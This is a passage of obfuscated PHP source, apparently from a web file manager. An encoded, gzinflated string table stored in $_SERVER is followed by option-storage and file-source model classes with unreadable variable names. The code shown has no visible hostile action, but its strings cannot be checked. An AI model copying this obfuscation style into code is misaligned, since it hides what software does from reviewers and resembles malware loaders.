224\275\255\222\344\313\6\273\362\367\51\375\32\273\262\2\15\131\172\7\227\30\252\330\342\0\305\36\371\223\330\52\330\2\260\344\177\20"."\173\77\104\5\365\123\311\146\133\63\263\21\141\372\163\302\102\14\122\326\50\203\112\215\223\134\77\115\57\72\4\46\264\356\274\311\134\62\316\156\156\156\366\66\317\102\377\63"."\15\153\346\32\256\265\271\271\52\111\163\163\53\371\237\106\20\231\57\114\212\63\6\341\7\206\330\40\301\270\256\103\203\340\254\50\30\305\12\243\301\372\203\330\16\114\301\115"."\x1b\x64\x64\x6\x6b\x3f\x9a\xf\xe2\x29\x91\xe1\x98\x85\x12\xe7\xb8\x50\x21\x77\x93\x10\xd2\xdd\x83\xc0\x2f\x7d\x61\x86\x65\x57\xdb\xec\x1b\x91\x3e\x68\xb6\xc9\xa0\x40\x7b\xb9\x59\x21\x4a\x26"."\326\321\102\152\305\331\306\33\25\52\146\372\345\312\174\154\160\51\120\270\207\366\262\10\257\374\234\3\144\242\247\207\270\365\160\64\15\345\161\272\140\304\20\164\166\247\171\77"."\61\100\22\260\140\72\116\162\53\211\203\362\345\6\211\346\266\171\44\224\347\156\2\160\60\312\113\242\217\232\320\127\52\140\14\153\54\327\41\163\134\25\7\65\16\36\317\103"."\x64\x48\x31\x87\xc5\x96\x61\x46\xb2\x9f\xc4\xe3\xca\xf0\xb1\x94\x9c\xb\xa5\x84\x66\x2\x28\x5a\x10\x3b\xfa\x11\x23\xef\xb0\x1e\x56\xa5\xac\xf2\xd8\x2e\xc4\x9\x59\x4f\x92\xce\x9c\xb8\x20\xb4".base64_decode('owP8aReqAcnapsDWo0HiLJq8ykeVVlv3q5pc2z2xZI7KpjAFrtI7YiFpppiAPfEl')."\xaa\x41\xc\x12\x62\x0\xaa\x4c\x13\xe4\x1e\x19\xa5\x2\xdc\x51\xae\x3c\x1\x2a\x97\xaf\xca\x0\xf0\xea\xd4\xe4\x2e\xa3\x46\x6a\xc\x77\xa5\x26\xbe\x18\x83\xdc\xa1\xac\xec\xa0\x91\x2a\x1a\x48"."\312\55\26\70\315\27\232\5\254\214\61\211\331\362\225\312\146\16\315\272\45\17\32\202\367\326\6\363\344\325\51\153\44\342\255\227\323\311\100\174\121\302\336\306\204\345\54\314"."\221\65\361\64\257\224\124\160\217\22\320\271\233\245\210\40\177\201\111\6\142\346\115\326\45\41\252\300\316\62\60\127\350\204\360\226\175\301\242\143\334\275\15\357\250\312\212\220".strrev('®>* …M’]g³¯.ˆ$”ûqÛşQ…8NÉWà®©•ka2ÇU‡Ë"òXHÀ™4')."\101\25\33\1\266\156\133\233\234\315\31\367\312\231\77\144\37\233\130\52\74\254\134\174\50\313\325\361\220\252\262\150\4\357\350\156\376\232\150\215\205\350\134\154\125\253\212\320"."\7\270\200\126\216\12\245\20\56\35\20\231\7\361\201\26\225\342\171\60\130\241\117\154\52\105\235\33\201\73\47\125\316\0\357\40\231\210\236\302\356\135\345\114\270\254\76\27"."\212\132\346\300\210\274\255\375\244\261\114\175\116\231\341\233\15\252\175\63\330\313\1\24\37\213\173\142\77\164\273\37\165\153\20\321\375\342\64\201\11\351\247\330\230\225\211\233".base64_decode('DF8ZNj+jFZ1R6tI5oUiFANpODpVNmzN6OD6Qkc6+iEyuJWkW72JRj+PaUfKDzZOi')."\x73\x9d\xd5\xae\xb1\xb3\x9e\xe8\xa0\x11\x3f\xe2\x12\xef\xe9\xa\xba\x35\xf6\xc8\xb9\x6c\xb3\xa3\x95\x39\x16\x17\xca\x6c\x78\x1a\x13\x92\x8a\x53\x8d\x1a\x20\x13\xcf\x2\x4\x43\x59\x4f\x9b\x65"."\42\172\220\174\105\24\355\270\236\223\203\21\223\213\134\360\65\227\136\243\10\354\236\107\332\346\170\325\7\322\166\105\166\366\43\371\37\107\41\311\321\274\104\370\171\147\51\234"."\142\124\151\311\64\320\44\105\220\364\265\210\107\227\120\120\262\44\41\262\216\104\45\305\357\146\134\44\35\63\116\121\144\212\211\131\233\340\2\210\337\25\334\3\113\216\103\305"."\142\37\301\242\147\162\26\122\147\125\26\32\207\211\26\341\275\104\216\261\260\7\371\76\66\155\265\142\152\124\105\242\244\21\115\163\37\116\60\72\142\220\40\142\122\147\132\235"."\336\131\263\275\314\77\230\154\271\302\270\6\300\333\150\57\110\313\0\63\130\14\155\200\116\44\244\23\151\114\351\206\213\170\64\21\176\34\210\363\26\76\237\304\313\13\17\225".base64_decode('pbNb5/qSxN2JjEaFIgJVo8QJ+mrF0xHC0R0OxVdXArQznPHgVF40hnpcMR3qSq5C')."\340\301\2\331\131\76\311\45\372\41\264\177\21\310\244\256\353\245\201\21\12\25\324\21\14\123\143\346\170\111\200\223\46\7\126\53\145\370\270\32\67\330\364\302\203\244\15\215"."\330\246\327\41\352\352\231\344\226\227\130\145\12\37\212\134\335\325\222\3\54\226\57\116\313\21\240\52\142\216\334\34\304\123\215\353\314\74\227\211\144\172\273\173\375\34\324\316"."\267\47\145\325\205\377\251\40\323\303\322\47\164\140\250\306\13\106\132\211\304\272\302\301\100\244\43\234\130\246\344\164\133\21\332\43\344\301\11\347\126\46\162\107\72\360\154\125"."\xa7\xf8\xdb\x7\xf8\xd3\x9b\x42\x14\xba\x37\xc3\xb9\x18\x4b\xf0\x2b\x92\xa2\x9c\xf4\xc8\x94\xb3\x58\xba\xfe\xf4\x72\x55\x89\x45\x6c\x75\x93\xaf\xca\x83\xa5\xa9\x35\x52\xe7\x85\x98\x51\x4a\x5c"."\52\353\325\351\47\165\154\155\40\265\130\312\120\251\321\32\110\137\273\6\362\100\205\234\32\21\36\172\161\272\306\33\305\61\303\62\304\306\147\71\46\345\322\3\35\75\341\250"."\32\210\104\142\53\34\12\205\102\216\134\346\317\201\144\344\327\103\244\231\21\223\100\153\257\166\213\6\116\245\144\47\356\56\261\5\235\76\331\75\136\211\335\220\300\153\216\374"."\x31\x1\x1a\x94\x9e\x2\x2a\x95\x35\xc3\xd2\x25\x0\x7d\xa1\x66\x26\x18\xb9\x68\xf9\xbc\xe3\x11\xc0\x7c\x56\xa\x56\x9c\x27\x6b\xcd\xaa\x54\x5a\x1\x83\x49\x1e\xf8\x6a\x25\x88\xe3\xc7\xe7\xff".base64_decode('x001MsITlpFhihvcJpG+MxCU37NkdVY9d/SlDyd5pKcvia8g9n6bSdgPoI0pLBxT').base64_decode('6cOVogrEGJcnS/Ilnz/j50NMP7DDvxC7ScIBwQjg5FAaro6yh4jrxUIuxjIwBVGE').strrev('Ò<Hd"´PF¦;«"!Ûø…tPr”Ü~¸Ğ'."\r".'¯ ê«á\'´ºÜ \'®Ü—œ`\'')."\246\64\323\327\310\370\153\20\312\42\146\141\55\52\40\56\272\102\205\222\355\140\235\273\145\245\171\151\156\50\200\120\72\202\65\302\352\107\146\141\262\12\340\20\34\105\130\273".strrev('È\'Q÷,ƒuHYÓ‹I	‘¤dŸÿ³D)?Wn¼Aî)7Ğ@[#ñå5˜£~"¾¸')."\x2e\xfc\x5a\xd2\x90\x39\xee\x7c\x58\x10\x43\xdc\xef\x23\x39\x5e\x46\x92\x36\xd\x31\x4\x96\xdf\x72\x72\x66\xf2\x54\xbd\x49\xa2\x90\x7\x6d\x15\xb4\xd4\x61\x16\xb1\xf7\x28\xc6\x3\x92\xc4\x52"."\325\63\350\317\0\374\262\343\314\335\10\212\250\240\312\106\276\250\202\103\106\76\123\346\372\64\2\320\243\13\306\234\344\302\52\45\32\173\270\227\74\263\326\301\160\62\74\203".strrev('¤´:Ë)>Ô"jÆ¡ç-IšI¬;eƒ6%°-øEÎœG.x‹®ùÏnì-ëR')."\50\222\11\317\62\174\276\27\113\11\330\73\165\31\17\171\104\215\242\72\367\73\53\322\116\343\370\123\316\235\313\233\51\55\37\247\152\150\16\173\231\62\342\246\270\152\251\43".base64_decode('GQX5tVJJ3FHJRyb612GwCHF9yW6VmN2r9Co7IdacdHVFgXCNVSmGqdTfAS1LfJ6s').strrev('"Êƒ™>á7'."\n".'¬Š0ÁX±ÕıŞ¥; ‹•bì‘r`0x—¥ìíG$e„Ä/Lÿ')."\105\54\15\307\106\306\113\11\121\303\36\362\101\60\205\114\270\177\1\224\257\140\347\33\76\164\251\223\237\16\75\313\271\30\34\26\247\271\354\53\104\250\140\270\237\241\143\325".base64_decode('8Ff0PLRn4vVU+maeh7+P56FeHT3wKp5HWDh+0TNAwg7P+ZoybjNX2KxiJ9ycBB8q')."\127\206\270\173\340\222\146\265\214\125\134\77\27\53\5\161\215\217\2\116\316\252\252\303\122\17\53\345\274\207\134\276\173\230\7\75\327\160\210\136\311\63\123\143\14\277\274\14"."\252\267\113\330\245\214\23\137\265\56\112\225\331\355\244\73\231\341\130\165\152\131\27\306\71\324\307\150\25\152\137\125\310\314\236\63\157\201\54\226\20\363\43\256\362\300\325\0".base64_decode('XD0CnSFmXHGuJ4U5NpX3LYl0qlRXP1/pwt3/s5Uv6H6aVFJwrn4GuGoEyCKUVH2k')."\xa3\xcc\xa5\xcb\x61\x62\x65\xb\x4b\x6c\x1f\x7a\x78\x89\x47\x2b\x9d\x75\xd1\x83\xbf\x46\x3f\xa4\x13\x4b\xec\x4\xfa\xa6\xa0\x99\xc7\xdc\x71\x1\x4b\xb9\xed\xb2\xe6\x64\x5\x6b\x71\x3c\x64\x24"._kodDe('KHEOhluznW1rv9F2tjoSQTqHIphSsGMuezEuxzQCfkwnucKBd60jlLtGiPXA+FZtDw==').base64_decode('QxkhoclTo+f+pQxv1HgzUtJ6+IJ2U7qMc3JezfZKC1IS/Ol2jEww0C2C4XT21VU8').strrev(''."\n".'FÚl°]ÉVìuè<`ö™£òNC:ü4ç™¹Ã,‰/o…%§¤Î&ª%Ó(ôÊ&Ê')."\222\267\101\165\321\322\33\202\102\204\103\144\76\320\11\330\303\304\145\51\61\157\14\164\161\223\107\115\322\276\162\312\225\360\350\112\317\306\232\362\267\30\165\214\317\143\314\11"."\53\252\335\301\27\242\160\207\353\111\141\202\225\334\357\14\263\41\42\250\100\140\71\311\162\326\301\204\360\167\326\34\114\211\345\176\112\21\221\146\262\43\145\24\344\233\0\216"."\x53\x40\x87\x44\x5\x9e\xd6\x26\x9d\x96\xe2\x60\x14\x5f\xd1\x4a\x41\x4\x24\x61\x2c\xe1\x7f\x78\xa4\xc3\xc0\x18\xfb\xa8\x72\xed\x7c\x66\xb6\x6c\xb9\x1e\x56\xa5\x2e\x6e\xe9\x37\x23\xd3\xff\xaf"."\xdf\xe\xfc\x7f\xf5\x64\xe0\xbc\x66\x26\x36\x77\x3c\x4c\xdc\x5\xc4\x32\xa3\xcf\xa6\x24\x37\xda\x54\x64\xeb\xea\x87\xf3\xd0\xdc\x17\x56\x11\x7f\x83\x5b\xa\x73\x3d\x5f\xe6\xa7\x8c\xb9\x2f\xd3"."\330\125\221\226\317\113\107\153\155\366\242\352\105\127\264\370\106\370\163\240\265\2\156\173\72\367\353\256\375\354\235\164\362\160\353\140\255\204\2\363\160\56\246\306\72\246\40\106"."\274\26\253\157\166\361\174\105\234\116\250\45\42\243\52\231\250\25\321\42\314\345\233\237\175\245\61\303\106\334\57\300\170\311\206\264\261\22\143\355\32\1\263\17\56\145\350\210"."\230\345\3\126\222\61\221\3\124\205\277\222\216\131\160\0\345\1\206\131\303\166\310\154\2\35\71\172\134\257\123\322\104\226\74\232\16\341\172\365\105\177\165\156\276\363\345\54"."\130\201\332\51\157\342\57\222\67\273\237\50\237\345\255\256\214\332\63\140\221\107\34\13\31\230\330\210\334\277\220\213\317\32\171\350\112\115\210\64\323\354\225\332\73\226\277\12".strrev(' iëíe‰âL3à¸–\\G!vÃçU|3Ù›Ò«šH¼(Nt“e½ùÛ/îKøhd*')."\246\71\260\142\21\223\320\151\212\271\227\36\244\306\173\112\270\227\304\316\300\210\254\117\76\265\231\265\234\244\134\16\40\207\104\316\222\37\375\160\346\304\346\3\316\275\264\270"."\126\262\264\131\266\244\144\34\136\53\55\136\141\262\304\101\216\303\217\7\333\216\271\20\217\12\270\37\23\40\174\70\145\255\35\34\66\334\301\312\40\351\212\22\21\333\31\347".base64_decode('6yQkkoCZJ1IoQbpkc95xchfqVZiyYkSkaJKLObhDv9iiMCzcVpBoen0QkN6ldudy')."\276\147\56\335\210\246\311\312\13\125\137\172\211\273\70\211\316\140\331\60\47\44\216\0\27\274\326\213\334\131\155\114\20\111\202\26\317\144\72\265\261\32\111\63\214\33\341\120"."\4\341\111\11\221\45\31\51\13\375\166\175\334\375\104\261\117\66\154\166\44\254\206\12\43\146\51\277\270\376\20\335\304\260\132\335\47\33\315\231\135\66\222\346\213\112\200\350".base64_decode('+xJcX0rie7DNhlCkol3hTLyo0mmSzZPxOUNpiMWM1wF1cXJYJMIoBlcUSBCk4msK')."\32\244\45\240\347\43\122\161\362\45\350\264\31\22\265\53\21\253\322\71\304\222\55\273\210\140\107\235\351\30\174\11\105\362\216\101\312\270\34\351\150\216\173\152\11\23\42\226"."\x2f\x5\x16\x88\x0\x96\xc6\x5\x9c\x51\x34\xbd\xee\x6a\xbd\x9c\xc1\xdd\x33\x9a\xc3\x1a\x37\xec\xf4\x90\xc4\x19\x55\x47\x56\xc3\xcb\x55\x83\xa\x15\xd5\x6e\xaf\xbb\x55\x6c\x4c\xdd\xfc\xa2\x28"."\244\252\75\222\46\105\322\254\221\207\266\250\146\66\32\205\163\12\162\325\221\167\232\41\300\171\151\24\316\133\25\315\62\113\342\25\51\237\255\125\254\151\272\127\75\170\40\163"."\310\324\350\260\213\63\247\111\247\33\317\232\211\253\253\203\25\347\116\115\204\24\265\133\41\144\13\256\33\355\132\255\250\231\170\332\126\210\324\256\123\240\26\256\145\61\65\260"."\xab\x50\x6d\xa8\xc6\xe3\x22\xae\x86\xa2\x5\x2d\x13\x9f\xd1\xb2\x5f\xab\x1a\xd1\xb2\xd6\x46\x6d\xbd\x8e\x78\xcd\xad\x6f\x39\x15\x2e\x5c\x70\x79\x60\xc0\x3f\x2a\x50\x57\xb0\xda\x10\xa7\x98\x37".base64_decode('RoQOGtMfn+HA75XiSNHkZ0ZG6Adi3eZA2T2QVaU512mxIrmcranO7sF8fTUHndeY')."\xcc\x5e\xb2\x3\xa0\x2c\x8f\x69\x1b\x69\xdd\xe9\xd7\x56\x76\x6f\x45\xe3\x59\x25\x79\x49\x36\xe8\x12\xcb\x9\x29\x83\x43\x21\xa0\x86\xe0\x8a\x80\x80\xae\x13\xe2\x6f\x5a\x9e\x44\xb1\x88\x35\xe1"."\260\277\240\164\2\134\11\320\333\304\40\276\265\346\367\110\304\47\53\75\127\151\164\302\54\333\36\34\227\64\113\344\267\335\264\155\161\273\116\331\172\102\14\342\303\321\43\51"."\x8f\xa0\x2f\x71\x69\x84\x1b\x45\x6e\x23\xc8\xb2\x25\xe8\x85\x7c\xc2\xbd\x26\xe6\x97\x13\x3a\x8d\x25\x48\xc9\x11\xc0\xb7\x1c\x3c\x20\x9f\x7d\x70\xbf\xd9\x59\x71\xdd\xc0\xa\x0\x62\x4e\x53\xe6".base64_decode('BPN4ia3ARXvwxYQ0ZII+geUnq78Q+3rLT2P88FKCV8OEIrx55hsu5RzZ6ctRXC30')."\x8b\x4a\x0\x29\xaa\x28\x82\xba\x49\x27\xb2\x2e\x30\x94\x49\x24\x13\x55\x51\xbd\x81\x44\x62\x45\x2c\xde\x41\xbd\xaa\x57\x45\x93\x5c\x92\x3a\x51\x55\x54\x6f\x77\x2c\x3a\x5d\x5c\xa8\x27\x10\x8e"."\124\305\141\315\243\250\52\74\222\321\250\160\57\151\45\271\276\233\256\25\341\340\62\321\22\162\121\54\204\363\245\41\223\311\334\331\345\105\102\313\63\56\135\62\14\325\13\302"."\x15\x9d\xc8\x53\x34\xd2\x23\x42\xb8\xa7\x49\xc4\xbb\xc5\x7c\x46\xf2\xf\xe7\x13\x45\x2e\x5\x3f\xb6\x48\xa1\x20\xac\x35\x14\x85\xb2\xe3\x25\x80\x62\x2f\xf3\x7c\xaf\x73\x42\x5a\xdc\x7c\xfb\x1c"."\x37\xe4\x12\x9c\xec\x7\x82\x60\xa4\x35\x27\x1f\xb4\x4\x30\xb3\xe6\x0\xc9\x82\xdd\xea\x8b\x6\x12\x2b\x6\x0\x37\xec\x78\x13\x54\xce\x86\xcd\x94\x74\x91\x40\xd9\x18\x30\xd3\x84\x21\x95\x34"."\303\350\267\43\332\326\162\65\57\212\251\64\17\357\170\41\147\373\337\221\40\363\337\205\253\0\0".base64_decode(''), 10, -8))); goto B¢ÎÄÄÈÚ; B¢ÎÄÄÈÚ: define($_SERVER[Ü©»’·][0], $_SERVER[Ü©»’·][1]); $_SERVER[ò‡Ÿ¥¨®] = explode($_SERVER[Ü©»’·][2], gzinflate(substr($_SERVER[Ü©»’·][3], 10, -8))); function binCheckEq($Ó¿”ó‡à, $Œİ’ı™) { return $Ó¿”ó‡à == $Œİ’ı™; } goto B‡…†ã¦Æï; Bƒ÷ÚöÔÃ•: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Õ´İº£ø = false, $“´×ÍÀ = '', $ÈÓĞ«Ú‘ = false) { $õ±¹ö²¤ =& $_SERVER[Ü©»’·]; $Ÿ„ŸÂ¡Ë = $this->cacheGet($“´×ÍÀ); $Å´İáÔ = $this->optionDefault($“´×ÍÀ); $Å´İáÔ = is_array($Å´İáÔ) ? $Å´İáÔ : array(); if (is_array($Ÿ„ŸÂ¡Ë)) { $Ÿ„ŸÂ¡Ë = array_merge($Å´İáÔ, $Ÿ„ŸÂ¡Ë); return $Õ´İº£ø ? isset($Ÿ„ŸÂ¡Ë[$Õ´İº£ø]) ? $Ÿ„ŸÂ¡Ë[$Õ´İº£ø] : null : $Ÿ„ŸÂ¡Ë; } $£ôóÍ¢ı = $this->filterWhere(array($õ±¹ö²¤[33] => $“´×ÍÀ)); $Ÿ„ŸÂ¡Ë = $this->where($£ôóÍ¢ı)->select(); $Ÿ„ŸÂ¡Ë = array_to_keyvalue($Ÿ„ŸÂ¡Ë, $õ±¹ö²¤[94], $õ±¹ö²¤[383]); foreach ($Ÿ„ŸÂ¡Ë as $ÒÜÅÊÑö => $ÒãÕ«Üõ) { if ($ÈÓĞ«Ú‘ || in_array($ÒÜÅÊÑö, $this->jsonField)) { $Ÿ„ŸÂ¡Ë[$ÒÜÅÊÑö] = json_decode($ÒãÕ«Üõ, !0); } } $this->cacheSet($“´×ÍÀ, $Ÿ„ŸÂ¡Ë); $Ÿ„ŸÂ¡Ë = array_merge($Å´İáÔ, $Ÿ„ŸÂ¡Ë); return $Õ´İº£ø ? $Ÿ„ŸÂ¡Ë[$Õ´İº£ø] : $Ÿ„ŸÂ¡Ë; } public function set($äÁİëÖ£, $ŞÄéú­º = false, $ó’¾ÕˆÉ = '') { $µ’èÄ“õ =& $_SERVER[Ü©»’·]; $this->cacheRemove($ó’¾ÕˆÉ); $¡ÏÛÏøû = array(); $§Ô÷Ô = is_array($äÁİëÖ£) ? $äÁİëÖ£ : array($äÁİëÖ£ => $ŞÄéú­º); foreach ($§Ô÷Ô as $ó¯âÈôô => $´«…ß°ˆ) { if (is_array($´«…ß°ˆ)) { $´«…ß°ˆ = json_encode_force($´«…ß°ˆ); } $this->checkLength($´«…ß°ˆ, !1, $this->tableName . $µ’èÄ“õ[4] . $äÁİëÖ£); $´«…ß°ˆ = self::textEncode($´«…ß°ˆ); $§Ô÷Ô = array($µ’èÄ“õ[33] => $ó’¾ÕˆÉ, $µ’èÄ“õ[94] => $ó¯âÈôô, $µ’èÄ“õ[383] => $´«…ß°ˆ); $¡ÏÛÏøû[] = $this->filterWhere($§Ô÷Ô); } if (!$¡ÏÛÏøû) { return !0; } $Ú¥ëá¸ = $this->cacheKey($µ’èÄ“õ[409]); CacheLock::lock($Ú¥ëá¸); $œ”¯¡é‡ = $this->addAll($¡ÏÛÏøû, array(), !0); CacheLock::unlock($Ú¥ëá¸); return $œ”¯¡é‡; } protected function optionDefault($¢ë·Ü“ = '') { return !1; } public function setDeep($¢öáÚñ, $­øÖ±ñ¤ = false, $ƒª •‡Ô = '') { $¡ü›Ó‰ = explode($_SERVER[Ü©»’·][10], $¢öáÚñ); $ö­û‘¥Ó = $this->get(); array_set_value($ö­û‘¥Ó, $¢öáÚñ, $­øÖ±ñ¤); $this->set($¡ü›Ó‰[0], $ö­û‘¥Ó[$¡ü›Ó‰[0]], $ƒª •‡Ô); } public function remove($‰„˜¿ãı, $©ù›şç÷ = '') { $ò¨™Ù… =& $_SERVER[Ü©»’·]; $this->cacheRemove($©ù›şç÷); $ îŠæ = $this->filterWhere(array($ò¨™Ù…[94] => $‰„˜¿ãı, $ò¨™Ù…[33] => $©ù›şç÷)); if (is_null($‰„˜¿ãı)) { unset($ îŠæ[$ò¨™Ù…[94]]); } return $this->where($ îŠæ)->delete(); } public function cacheSet($Œ¢´´£š, $ú¦í¤åö = false) { return Cache::set($this->cacheKey($Œ¢´´£š), $ú¦í¤åö); } public function cacheGet($åÏ·¸á) { return Cache::get($this->cacheKey($åÏ·¸á)); } public function cacheRemove($Âëçî¡Å) { return Cache::remove($this->cacheKey($Âëçî¡Å)); } protected function filterWhere($Í¤½°) { return $Í¤½°; } protected function cacheKey($ãóÃâ»­) { return $ãóÃâ»­; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\162\143\145"; protected $tableMeta = array("\164\141\142\x6c\x65\x4e\141\155\145" => "\x69\x6f\137\x73\157\165\162\143\145\137\x6d\x65\x74\x61", "\x6d\x65\x74\141\106\151\145\154\144" => "\163\157\x75\x72\143\x65\x49\x44"); protected $dataAuto = array(array("\155\157\144\x69\x66\x79\124\151\x6d\145", "\164\x69\x6d\x65", "\x69\156\163\145\162\x74", "\146\165\156\143\x74\x69\157\x6e"), array("\x63\162\145\x61\164\145\x54\x69\155\x65", "\164\151\155\x65", "\151\x6e\x73\145\162\x74", "\146\x75\156\x63\x74\151\157\x6e"), array("\166\x69\145\167\x54\151\155\145", "\164\151\x6d\x65", "\x69\156\x73\x65\162\x74", "\x66\165\x6e\143\164\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Œ„ïÜ™) { return $this->listSource(array($_SERVER[Ü©»’·][410] => $Œ„ïÜ™)); } public function typeName($Øçùö») { static $¥ô¬ï²ı = array(self::TYPE_SYSTEM => "\x73\171\x73\164\145\x6d", self::TYPE_USER => "\165\163\145\162", self::TYPE_GROUP => "\147\162\157\165\x70"); return $¥ô¬ï²ı[$Øçùö» . $_SERVER[Ü©»’·][12]]; } public function sourceListInfo($°˜í¼´Ò, $ÔºªááŸ = false) { $£Ê—›á˜ =& $_SERVER[Ü©»’·]; $°˜í¼´Ò = $°˜í¼´Ò ? $°˜í¼´Ò : array(); $°˜í¼´Ò = array_filter(array_unique($°˜í¼´Ò)); if (!$°˜í¼´Ò) { return array(); } $”’ù—÷ª = $this->where(array($£Ê—›á˜[411] => array($£Ê—›á˜[7], $°˜í¼´Ò)))->select(); $this->_listDataApply($”’ù—÷ª, $ÔºªááŸ); return array_to_keyvalue($”’ù—÷ª, $£Ê—›á˜[411]); } public function pathInfoFilter(&$Ÿ¸ï²øè) { $›ŸÖ˜Í =& $_SERVER[Ü©»’·]; static $Ş©°Ñ» = false; static $ ¸öƒğÜ = false; static $Âªé¶¦ş = false; if (!$Ş©°Ñ») { $‘ğïºÍ = $›ŸÖ˜Í[412]; $‘ğïºÍ .= $›ŸÖ˜Í[413]; $‘ğïºÍ .= $›ŸÖ˜Í[414]; $æ¤¨¾õ¨ = $›ŸÖ˜Í[415]; $ÛØÀ©ğ± = explode($›ŸÖ˜Í[50], $æ¤¨¾õ¨); $Ş©°Ñ» = explode($›ŸÖ˜Í[50], $‘ğïºÍ); $ ¸öƒğÜ = array(); foreach ($Ş©°Ñ» as $¶‰ª«“) { if (in_array($¶‰ª«“, $ÛØÀ©ğ±)) { continue; } $ ¸öƒğÜ[] = $¶‰ª«“; } $Âªé¶¦ş = explode($›ŸÖ˜Í[50], $›ŸÖ˜Í[416]); } foreach ($Âªé¶¦ş as $Åƒ“Òú) { if (isset($Ÿ¸ï²øè[$Åƒ“Òú])) { $Ÿ¸ï²øè[$Åƒ“Òú] = intval($Ÿ¸ï²øè[$Åƒ“Òú]); } } $Ÿ¸ï²øè[$›ŸÖ˜Í[84]] = $›ŸÖ˜Í[417] . $Ÿ¸ï²øè[$›ŸÖ˜Í[411]] . $›ŸÖ˜Í[418]; $Ÿ¸ï²øè[$›ŸÖ˜Í[33]] = $Ÿ¸ï²øè[$›ŸÖ˜Í[419]] == 1 ? $›ŸÖ˜Í[75] : $›ŸÖ˜Í[199]; $Ÿ¸ï²øè[$›ŸÖ˜Í[420]] = $this->typeName($Ÿ¸ï²øè[$›ŸÖ˜Í[420]]); if ($Ÿ¸ï²øè[$›ŸÖ˜Í[419]] != 1) { $Ÿ¸ï²øè[$›ŸÖ˜Í[174]] = $Ÿ¸ï²øè[$›ŸÖ˜Í[421]]; unset($Ÿ¸ï²øè[$›ŸÖ˜Í[421]]); } $“Ö´­Ìû = $Ş©°Ñ»; if (isset($Ÿ¸ï²øè[$›ŸÖ˜Í[422]]) && $Ÿ¸ï²øè[$›ŸÖ˜Í[422]][$›ŸÖ˜Í[423]] == -1) { $“Ö´­Ìû = $ ¸öƒğÜ; } $Ÿ¸ï²øè = array_field_key($Ÿ¸ï²øè, $“Ö´­Ìû); return $Ÿ¸ï²øè; } public function listUserFav() { $Í‚’ŠÉê =& $_SERVER[Ü©»’·]; $Â¤ä¯ÂÁ = Model($Í‚’ŠÉê[424])->listData(); $ìÂìö³ú = array_filter_by_field($Â¤ä¯ÂÁ, $Í‚’ŠÉê[33], $Í‚’ŠÉê[425]); $ìÂìö³ú = array_to_keyvalue($ìÂìö³ú, $Í‚’ŠÉê[12], $Í‚’ŠÉê[84]); if ($ìÂìö³ú) { $ôœ¸õÌÀ = $this->listSource(array($Í‚’ŠÉê[426] => array($Í‚’ŠÉê[427], $ìÂìö³ú))); } $ôœ¸õÌÀ = array_to_keyvalue($ôœ¸õÌÀ[$Í‚’ŠÉê[378]], $Í‚’ŠÉê[411]); foreach ($Â¤ä¯ÂÁ as &$Ş•§§É”) { $Ş•§§É” = array($Í‚’ŠÉê[428] => $Ş•§§É”[$Í‚’ŠÉê[408]], $Í‚’ŠÉê[429] => $Ş•§§É”[$Í‚’ŠÉê[32]], $Í‚’ŠÉê[430] => $Ş•§§É”[$Í‚’ŠÉê[84]], $Í‚’ŠÉê[431] => $Ş•§§É”[$Í‚’ŠÉê[33]], $Í‚’ŠÉê[432] => $Ş•§§É”[$Í‚’ŠÉê[200]], $Í‚’ŠÉê[433] => $Ş•§§É”[$Í‚’ŠÉê[85]]); if ($Ş•§§É”[$Í‚’ŠÉê[33]] == $Í‚’ŠÉê[425] && $ôœ¸õÌÀ[$Ş•§§É”[$Í‚’ŠÉê[84]]]) { $Ş•§§É”[$Í‚’ŠÉê[86]] = $ôœ¸õÌÀ[$Ş•§§É”[$Í‚’ŠÉê[84]]]; } } unset($Ş•§§É”); return $Â¤ä¯ÂÁ; } public function listUserTag($çÙ÷ÜÀ) { $ Î ¸·’ =& $_SERVER[Ü©»’·]; if ($çÙ÷ÜÀ && !is_array($çÙ÷ÜÀ)) { $çÙ÷ÜÀ = array($çÙ÷ÜÀ); } $û¦²˜ƒì = Model($ Î ¸·’[434])->listData(); $±•™åã€ = array(); $úäŒµòº = array(); foreach ($û¦²˜ƒì as $ºˆ‚”Ğ·) { $³ñŸëƒ = $ºˆ‚”Ğ·[$ Î ¸·’[84]]; if (!$³ñŸëƒ) { continue; } if (!isset($úäŒµòº[$³ñŸëƒ])) { $úäŒµòº[$³ñŸëƒ] = array(); } $úäŒµòº[$³ñŸëƒ][] = $ºˆ‚”Ğ·[$ Î ¸·’[435]]; $±•™åã€[$ºˆ‚”Ğ·[$ Î ¸·’[84]]] = $ºˆ‚”Ğ·; } $¤˜šé¸‚ = array(); $¯ŒºË½Ù = array(); $óÆßÔ«õ = array(); foreach ($úäŒµòº as $áÇ®¬Ôş => $¢£¥ó–¾) { $ †­Øå = !0; if (!$çÙ÷ÜÀ) { $¤˜šé¸‚[] = $áÇ®¬Ôş; continue; } foreach ($çÙ÷ÜÀ as $Ş£ó°¤Ê) { if (!in_array($Ş£ó°¤Ê, $¢£¥ó–¾)) { $ †­Øå = !1; break; } } if (!$ †­Øå) { continue; } if (!is_numeric($áÇ®¬Ôş)) { $Éá¨’½ = $±•™åã€[$áÇ®¬Ôş]; $¨‰ƒÏı = array($ Î ¸·’[32] => $Éá¨’½[$ Î ¸·’[32]], $ Î ¸·’[84] => $Éá¨’½[$ Î ¸·’[84]], $ Î ¸·’[33] => $Éá¨’½[$ Î ¸·’[33]], $ Î ¸·’[86] => array($ Î ¸·’[436] => 1), $ Î ¸·’[201] => !0); if ($Éá¨’½[$ Î ¸·’[33]] == $ Î ¸·’[199]) { $óÆßÔ«õ[] = $¨‰ƒÏı; } if ($Éá¨’½[$ Î ¸·’[33]] == $ Î ¸·’[75]) { $¯ŒºË½Ù[] = $¨‰ƒÏı; } continue; } $¤˜šé¸‚[] = $áÇ®¬Ôş; } if ($¤˜šé¸‚) { $å‚’ë»ò = $this->listSource(array($ Î ¸·’[426] => array($ Î ¸·’[427], $¤˜šé¸‚))); } $å‚’ë»ò = $å‚’ë»ò ? $å‚’ë»ò : array($ Î ¸·’[82] => array(), $ Î ¸·’[83] => array()); $å‚’ë»ò[$ Î ¸·’[82]] = array_merge($å‚’ë»ò[$ Î ¸·’[82]], $¯ŒºË½Ù); $å‚’ë»ò[$ Î 